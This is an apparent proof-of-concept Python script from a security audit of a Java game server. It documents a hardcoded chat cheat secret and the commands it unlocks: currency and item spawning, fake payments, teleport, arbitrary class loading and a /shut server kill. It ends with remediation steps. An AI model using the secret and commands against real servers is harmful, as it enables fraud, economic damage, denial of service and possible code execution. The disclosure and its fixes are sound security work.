#!/usr/bin/env python3
"""
PoC #3: Cheat Commands in Chat (CRITICAL when testserver=true)

Demonstrates:
  1. Hardcoded cheat secret: "timeismoney@@!!" (Server.java:208)
  2. When testserver=true, any player can type the secret in chat
     to enable player.cheat (PlayerPacketHandler.java:13754)
  3. Once cheat is enabled, chat commands give god-mode:
     - /money <amount>  -> set money
     - /credit <amount> -> set credit
     - /exp <amount>    -> set experience
     - /item <id> <qty> -> spawn items
     - /charge <amount> -> simulate payment
     - /go <map> <x> <y> -> teleport
     - /load <class>    -> load arbitrary class
     - /shut            -> System.exit(0) — KILL THE SERVER

Source references:
  - Server.java:204 -> antiCheat = false (default)
  - Server.java:208 -> cheat = "timeismoney@@!!"
  - Server.java:209 -> cheatOn = false (but testserver enables it)
  - PlayerPacketHandler.java:13754 -> secret check, sets player.cheat
  - PlayerPacketHandler.java:13935 -> /money and /credit
  - PlayerPacketHandler.java:14233 -> /shut calls System.exit(0)
"""

import socket
import struct
import argparse
import sys

# ---------------------------------------------------------------------------
# Hardcoded cheat secret from Server.java:208
# ---------------------------------------------------------------------------
CHEAT_SECRET = "timeismoney@@!!"

# ---------------------------------------------------------------------------
# Cheat commands available after enabling player.cheat
# ---------------------------------------------------------------------------
CHEAT_COMMANDS = {
    "/money":  {"args": "<amount>",       "desc": "Set money to any value"},
    "/credit": {"args": "<amount>",       "desc": "Set credit (premium currency) to any value"},
    "/exp":    {"args": "<amount>",       "desc": "Set experience to any value"},
    "/item":   {"args": "<id> <qty>",     "desc": "Spawn any item at any quantity"},
    "/charge": {"args": "<amount>",       "desc": "Simulate a real-money payment"},
    "/go":     {"args": "<map> <x> <y>",  "desc": "Teleport to any map/coordinates"},
    "/load":   {"args": "<classname>",    "desc": "Load arbitrary Java class"},
    "/shut":   {"args": "(none)",         "desc": "System.exit(0) — KILL THE SERVER"},
}

# ---------------------------------------------------------------------------
# Packet helpers (simplified — real protocol depends on game client)
# ---------------------------------------------------------------------------

def build_chat_packet(message, channel="world", serial=1):
    """Build a simplified chat packet."""
    # Real format: [opcode:2][serial:4][channel_len:1][channel][msg_len:2][msg]
    OPCODE_CHAT = 0x2001  # illustrative
    header = struct.pack(">H", OPCODE_CHAT)
    header += struct.pack(">I", serial)
    chan_bytes = channel.encode("utf-8")
    header += struct.pack("B", len(chan_bytes))
    header += chan_bytes
    msg_bytes = message.encode("utf-8")
    header += struct.pack(">H", len(msg_bytes))
    return header + msg_bytes


# ---------------------------------------------------------------------------
# Attack demonstration
# ---------------------------------------------------------------------------

def demo_enable_cheat():
    """Show how to enable cheat mode."""
    print("\n[!] Enabling Cheat Mode:")
    print(f"    Secret: '{CHEAT_SECRET}' (Server.java:208)")
    print()
    print("    Step 1: Player types the secret in chat")
    print(f'    -> Chat message: "{CHEAT_SECRET}"')
    print()
    print("    Step 2: Server checks (PlayerPacketHandler.java:13754):")
    print("    if (message.equals(Server.server.cheat)) {")
    print("        player.cheat = true;")
    print("    }")
    print()
    print("    [!] player.cheat is now TRUE — all cheat commands unlocked.")
    print()
    print("    PREREQUISITE: testserver=true in server config")
    print("    (If testserver is false, the secret check is skipped entirely)")

def demo_all_commands():
    """List all available cheat commands."""
    print("\n[!] Available Cheat Commands (after enabling cheat):")
    print()
    for cmd, info in CHEAT_COMMANDS.items():
        print(f"    {cmd:10s} {info['args']:20s} — {info['desc']}")

def demo_shut_attack():
    """Demonstrate the /shut command — kills the server."""
    print("\n[!] CRITICAL: /shut Command — Server Kill:")
    print("    PlayerPacketHandler.java:14233:")
    print('    }else if(cmds[0].equals("/shut")){')
    print('        System.exit(0);')
    print('    }')
    print()
    print("    [!] ANY player with cheat enabled can KILL THE ENTIRE SERVER.")
    print("    [!] No permission check, no confirmation, no cooldown.")
    print()
    print("    Attack scenario:")
    print("    1. Enable cheat with secret")
    print("    2. Type /shut in chat")
    print("    3. Server process terminates immediately")
    print("    4. All players disconnected, all unsaved data lost")

def demo_economy_destroy():
    """Demonstrate economy destruction via /money and /credit."""
    print("\n[!] Economy Destruction:")
    print("    /money 999999999  -> Set money to 999 million")
    print("    /credit 999999999 -> Set premium currency to 999 million")
    print("    /item 10001 999   -> Spawn 999 of any rare item")
    print("    /charge 999999    -> Simulate $999,999 payment")
    print()
    print("    [!] Can destroy game economy in seconds.")
    print("    [!] Can create items that shouldn't exist.")
    print("    [!] Can fake payments (fraud vector).")

def demo_teleport():
    """Demonstrate teleport cheat."""
    print("\n[!] Teleport (/go):")
    print("    /go <mapId> <x> <y>")
    print()
    print("    [!] Can teleport to any map, bypassing:")
    print("    - Level requirements")
    print("    - Quest progression")
    print("    - VIP-only areas")
    print("    - Event-locked zones")

def demo_load_class():
    """Demonstrate arbitrary class loading."""
    print("\n[!] Arbitrary Class Loading (/load):")
    print("    /load <fully.qualified.ClassName>")
    print()
    print("    [!] Similar to GM exec(), loads arbitrary Java classes.")
    print("    [!] Can be used for RCE if combined with a malicious class.")

def main():
    parser = argparse.ArgumentParser(
        description="PoC: Cheat Commands in Chat",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--host", default="127.0.0.1", help="Game server host")
    parser.add_argument("--port", type=int, default=9001, help="Game server port")
    parser.add_argument("--demo", action="store_true", help="Run demo without connecting")
    args = parser.parse_args()

    print("=" * 60)
    print("PoC #3: Cheat Commands in Chat (testserver=true)")
    print("=" * 60)
    print()
    print("VULNERABILITY SUMMARY:")
    print(f"  1. Hardcoded secret: '{CHEAT_SECRET}' (Server.java:208)")
    print("  2. Secret typed in chat enables player.cheat (PlayerPacketHandler.java:13754)")
    print("  3. 8+ cheat commands available via chat (PlayerPacketHandler.java)")
    print("  4. /shut calls System.exit(0) — kills server (line 14233)")
    print("  5. /money, /credit, /charge destroy economy")
    print("  6. /load loads arbitrary classes (RCE risk)")
    print()
    print("IMPACT: Economy destruction, server kill, RCE")
    print()

    demo_enable_cheat()
    demo_all_commands()
    demo_shut_attack()
    demo_economy_destroy()
    demo_teleport()
    demo_load_class()

    print()
    print("REMEDIATION:")
    print("  - NEVER enable testserver=true in production")
    print("  - Remove all cheat commands from production builds entirely")
    print("  - If test commands are needed, use a separate admin tool")
    print("  - Remove /shut (System.exit) from any player-accessible code path")
    print("  - Remove /load (arbitrary class loading) from player code path")
    print("  - Use compile-time flags (#ifdef DEBUG) to exclude cheat code")

if __name__ == "__main__":
    main()